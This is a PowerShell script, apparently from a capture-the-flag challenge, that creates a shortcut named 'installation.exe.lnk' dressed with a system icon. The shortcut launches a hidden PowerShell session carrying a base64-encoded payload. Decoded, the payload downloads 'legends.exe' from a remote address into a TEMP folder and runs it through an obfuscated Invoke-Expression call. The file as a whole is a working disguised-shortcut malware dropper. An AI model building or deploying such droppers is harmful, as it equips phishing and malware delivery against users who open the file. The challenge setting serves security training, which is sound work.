$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\Users\GIC2024\installation.exe.lnk")

# Set the target path to PowerShell
$Shortcut.TargetPath = "powershell.exe"

# Set the arguments for the PowerShell command
$Shortcut.Arguments = "-window hidden -noni -enc V3JpdGUtSG9zdCAiVGhpcyBpcyBhIGxlZ2l0aW1hdGUgZ2FtZSBsb2wiOyRnYW1lPSdodHRwOi8vMTkyLjE2OC4xLjczOjQwNDAvYzNWdVkzUm1lMlknKycwYXpOZlRETm5aVzVrYzE4d1psOXNibXRmWVc1a1gxcGxiR1JoWDJjMGInKydUTSUyRklYMCUzRC9sZWdlbmRzLmV4ZSc7JHNraWJpZGk9J1NtdXJmVGVtcCc7JHNtdXJmeT1bU3lzdGVtLklPLlBhdGhdOjpDb21iaW5lKCRlbnY6VEVNUCwkc2tpYmlkaSk7aWYoLW5vdCAoVGVzdC1QYXRoICRzbXVyZnkpKXtOZXctSXRlbSAtUGF0aCAkc211cmZ5IC1JdGVtVHlwZSBEaXJlY3RvcnkgLUZvcmNlfTtpZihUZXN0LVBhdGggJHNtdXJmeSl7JHplbGRhPVtTeXN0ZW0uSU8uUGF0aF06OkNvbWJpbmUoJHNtdXJmeSwnbGVnZW5kcy5leGUnKTtJbnZva2UtV2ViUmVxdWVzdCAtVXJpICRnYW1lIC1PdXRGaWxlICR6ZWxkYTskc2hlbGxpZFsxXSskc2hlbGxpZFsxM10rJ3gnICR6ZWxkYX0K"

# Set a default Windows icon (example: icon from shell32.dll)
$Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,2"  # You can change the index (0) to select different icons

# Save the shortcut
$Shortcut.Save()